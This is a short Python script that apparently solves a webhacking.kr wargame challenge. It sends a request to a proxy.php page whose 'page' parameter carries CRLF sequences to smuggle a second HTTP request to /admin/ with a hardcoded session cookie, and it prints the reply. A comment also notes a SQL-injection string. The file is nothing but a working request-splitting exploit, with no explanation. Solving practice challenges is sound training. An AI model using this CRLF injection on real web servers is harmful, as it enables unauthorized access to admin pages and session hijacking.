import requests
import info

url = "http://webhacking.kr:10008/proxy.php"

# admin' -- 
# crlf : %0d%0a
params = '?page=/admin/%20HTTP/1.1%0d%0aHost:%20webhacking.kr:10008%0d%0aCookie:%20PHPSESSID=hgag9kj1ags7cm627r5mqleubf%0d%0aConnection:Close%0d%0a%0d%0a'

res = requests.get(url = url + params, cookies = info.cookies)
print(res.text)

